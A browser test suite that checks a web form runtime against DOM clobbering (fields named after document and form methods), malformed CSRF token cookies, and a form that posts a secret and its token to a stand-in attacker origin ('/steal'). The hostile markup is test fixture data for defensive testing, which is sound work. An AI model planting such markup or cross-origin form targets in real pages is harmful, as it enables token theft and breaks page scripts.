// The runtime against a hostile server and hostile markup, in Chromium and
// Firefox. The committed dist/ runs under the page's exact content security
// policy, served by tests/support/fixture.mjs; the last section uses the proof app.
// Each test states what must hold, so taking the protection away fails it.

import assert from "node:assert/strict";
import { after, before, describe, test } from "node:test";
import { chromium, firefox } from "playwright";
import { CSP, page as doc, start } from "./support/fixture.mjs";

const PROOF = process.env.UI_PROOF_URL || "http://127.0.0.1:8090";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const GIF = "data:image/gif;base64,R0lGODlhAQABAAAAACw=";
let unique = 0;
const key = (name) => `${name}-${++unique}`;

for (const [engine, launcher] of [["chromium", chromium], ["firefox", firefox]]) {
  describe(engine, () => {
    let browser, f;

    before(async () => {
      browser = await launcher.launch();
      f = await start();
    });
    after(async () => {
      await browser.close();
      f.close();
    });

    /** A fresh context on `path`, with the runtime started. */
    async function fresh(path, options = {}) {
      const context = await browser.newContext(options);
      const page = await context.newPage();
      const errors = [];
      page.on("pageerror", (error) => errors.push(String(error)));
      await page.goto(f.origin + path, { waitUntil: "load" });
      await sleep(60);
      return { context, page, errors };
    }
    const route = (path, body, headers) => f.routes.set(path, (req, res) => f.html(res, typeof body === "function" ? body() : body, headers));
    const toasts = (page) => page.locator("[data-slot=toast]").allTextContents();
    const hits = (path) => f.log.filter((entry) => entry.path === path);
    const attr = (page, name) => page.evaluate((n) => document.documentElement.getAttribute(n), name);

    /** A page whose button submits a form that answers `envelope`. */
    async function afterOps(envelope, { status, body = "" } = {}) {
      const name = key("ops");
      route(`/${name}`, doc(`<div id="t">start</div>${body}<form id="f" data-ui-form method="post" action="/${name}-post"><button id="go">go</button></form>`));
      f.routes.set(`/${name}-post`, (req, res) => f.ops(res, typeof envelope === "function" ? envelope() : envelope, status));
      const opened = await fresh(`/${name}`);
      await opened.page.click("#go");
      await sleep(250);
      return opened;
    }

    test(`a field with any name leaves the form working (${engine})`, async () => {
      for (const name of ["method", "enctype", "elements", "hasAttribute", "getAttribute", "removeAttribute", "setAttribute", "toggleAttribute", "querySelectorAll", "closest", "action", "target", "id", "submit", "form", "nodeName", "attributes"]) {
        const path = key("clobber");
        route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="/${path}-post"><div data-slot="field"><input id="x" name="${name}" value="v"></div><button id="go">go</button></form>`));
        f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [{ op: "errors", form: "f", fields: { [name]: ["bad"] } }] }, 422));
        const { context, page, errors } = await fresh(`/${path}`);
        await page.evaluate(() => Document.prototype.getElementById.call(document, "go").click());
        await sleep(200);
        const state = await page.evaluate(() => {
          const form = Document.prototype.querySelector.call(document, "form");
          return { pending: Element.prototype.hasAttribute.call(form, "data-pending"), shown: !!Document.prototype.querySelector.call(document, "[data-slot=field-error]") };
        });
        const posts = hits(`/${path}-post`);
        assert.equal(posts.length, 1, `${name}: one post`);
        assert.equal(posts[0].headers["x-navree-ui"], "1", `${name}: by the runtime`);
        assert.deepEqual(state, { pending: false, shown: true }, name);
        assert.deepEqual(errors, [], name);
        await context.close();
      }
    });

    test(`a field named enctype keeps a form multipart (${engine})`, async () => {
      const path = key("enctype");
      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" enctype="multipart/form-data" action="/${path}-post"><input name="enctype" value="v"><button id="go">go</button></form>`));
      f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [] }));
      const { context, page } = await fresh(`/${path}`);
      await page.click("#go");
      await sleep(200);
      assert.match(hits(`/${path}-post`)[0].headers["content-type"], /^multipart\/form-data/);
      await context.close();
    });

    test(`a malformed token cookie doesn't hang a form (${engine})`, async () => {
      for (const value of ["%E0%A4%A", "%0Abad", "%"]) {
        const path = key("badtoken");
        route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="/${path}-post"><input name="a" value="1"><button id="go">go</button></form>`), { "set-cookie": `XSRF-TOKEN=${value}; Path=/` });
        f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [{ op: "toast", tone: "info", text: "done" }] }));
        const { context, page, errors } = await fresh(`/${path}`);
        await page.click("#go");
        await sleep(200);
        assert.equal(hits(`/${path}-post`).length, 1, value);
        assert.equal(hits(`/${path}-post`)[0].headers["x-xsrf-token"], undefined, value);
        assert.equal(await page.evaluate(() => document.getElementById("f").hasAttribute("data-pending")), false, value);
        assert.deepEqual(await toasts(page), ["done"], value);
        assert.deepEqual(errors, [], value);
        await context.close();
      }
    });

    test(`a good token after a malformed one is the one sent (${engine})`, async () => {
      const path = key("twotokens");
      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="/${path}-post"><button id="go">go</button></form>`), { "set-cookie": `XSRF-TOKEN=%E0%A4%A; Path=/${path}` });
      f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [] }));
      const context = await browser.newContext();
      await context.addCookies([{ name: "XSRF-TOKEN", value: "good%3Dtoken", domain: "127.0.0.1", path: "/" }]);
      const page = await context.newPage();
      await page.goto(`${f.origin}/${path}`);
      await sleep(60);
      await page.click("#go");
      await sleep(200);
      assert.equal(hits(`/${path}-post`)[0].headers["x-xsrf-token"], "good=token");
      await context.close();
    });

    test(`a form aimed at another origin is stopped with its token (${engine})`, async () => {
      f.evil.length = 0;
      const path = key("xorigin");
      route(`/${path}`, doc(`<form id="f" data-ui-form method="post" action="${f.evilOrigin}/steal"><input name="secret" value="s"><button id="go">go</button></form>`), { "set-cookie": "XSRF-TOKEN=tok; Path=/" });
      const { context, page } = await fresh(`/${path}`);
      await page.click("#go");
      await sleep(200);
      assert.deepEqual(f.evil, []);
      assert.equal(await page.evaluate(() => document.getElementById("f").hasAttribute("data-pending")), false);
      await context.close();
    });

    test(`named elements can't switch the runtime off (${engine})`, async () => {
      for (const name of ["cookie", "getElementById", "querySelector", "querySelectorAll", "body", "head", "documentElement", "activeElement", "title", "createElement", "addEventListener"]) {
        const path = key("document");
        route(`/${path}`, doc(`<div id="t">start</div><img name="${name}" src="${GIF}"><form id="f" data-ui-form method="post" action="/${path}-post"><input name="a" value="1"><button id="go">go</button></form><a id="n" href="/${path}-next">n</a>`));
        f.routes.set(`/${path}-post`, (req, res) => f.ops(res, { ops: [{ op: "morph", target: "t", html: `<div id="t">morphed</div>` }, { op: "toast", tone: "info", text: "done" }] }));
        route(`/${path}-next`, doc(`<h1 id="h">next</h1><img name="${name}" src="${GIF}">`, { title: "next" }));
        const { context, page, errors } = await fresh(`/${path}`);
        await page.evaluate(() => Document.prototype.getElementById.call(document, "go").click());
        await sleep(200);
        const state = await page.evaluate(() => ({
          t: Document.prototype.getElementById.call(document, "t").textContent,
          pending: Element.prototype.hasAttribute.call(Document.prototype.querySelector.call(document, "form"), "data-pending"),
          toast: Document.prototype.querySelector.call(document, "[data-slot=toast]")?.textContent,
        }));
        assert.deepEqual(state, { t: "morphed", pending: false, toast: "done" }, name);
        await page.evaluate(() => Document.prototype.getElementById.call(document, "n").click());
        await sleep(200);
        assert.equal(await page.evaluate(() => !!Document.prototype.getElementById.call(document, "h")), true, `${name}: boosted`);
        assert.equal(hits(`/${path}-next`)[0].headers["x-navree-ui"], "1", `${name}: boosted by the runtime`);
        assert.deepEqual(errors, [], name);
        await context.close();
      }
    });

    test(`an element with the id addEventListener doesn't stop the runtime (${engine})`, async () => {
      const name = key("windowname");
      route(`/${name}`, doc(`<div id="addEventListener"></div><div id="t">start</div><form id="f" data-ui-form method="post" action="/${name}-post"><button id="go">go</button></form>`));
      f.routes.set(`/${name}-post`, (req, res) => f.ops(res, { ops: [{ op: "toast", tone: "info", text: "done" }] }));
      const { context, page, errors } = await fresh(`/${name}`);
      await page.click("#go");
      await sleep(200);
      assert.deepEqual(await toasts(page), ["done"]);
      assert.deepEqual(errors, []);
      await context.close();
    });
  });
}
